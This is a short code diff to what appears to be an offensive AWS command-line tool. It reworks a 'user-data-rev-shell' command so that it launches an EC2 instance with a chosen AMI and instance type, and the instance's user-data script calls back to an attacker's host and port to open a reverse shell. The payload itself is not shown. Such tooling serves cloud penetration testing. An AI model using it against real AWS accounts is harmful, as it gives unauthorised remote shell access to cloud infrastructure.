@@ -40,8 +40,9 @@ def _create_session(profile: str):
 # ************* MAIN **************
 # *********************************
 
-def _user_data_rev_shell(session: Session, rhost: str, rport: int):
+def _user_data_rev_shell(session: Session, ami_id: str, instance_type: str, rhost: str, rport: int):
     console.log("Running `user-data-rev-shell` command.. ([blink purple]OK[/blink purple])")
+    Ec2(session, console).user_data_rev_shell(ami_id, instance_type, rhost, rport)
 
 def _launch_ec2_with_instance_profile(
     session: Session, key_name: str, ami_id: str, instance_profile_arn: str,
@@ -115,15 +116,16 @@ def _whoami(session: Session):
 
 @app.command()
 def user_data_rev_shell(
-        rhost: str = Argument(..., help="The remote attacker's IP address"),
+        ami_id: str = Option("ami-00a208c7cdba991ea", help="The ID of the AMI"),
+        instance_type: str = Option("t2.micro", help="The instance type to create"),
+        rhost: str = Argument(..., help="The remote attacker's IP address|URI"),
         rport: int=Option(7777, help="The remote attacker's listening port"),
-        instance_type=Option("t2.micro", help="Ec2 instance type"),
         profile: str = Argument(..., help="AWS profile")
     ):
     """
     Obtain a reverse shell via user-data script
     """
-    _user_data_rev_shell(_create_session(profile))
+    _user_data_rev_shell(_create_session(profile), ami_id, instance_type, rhost, rport)
 
 @app.command()
 def launch_ec2_with_instance_profile(
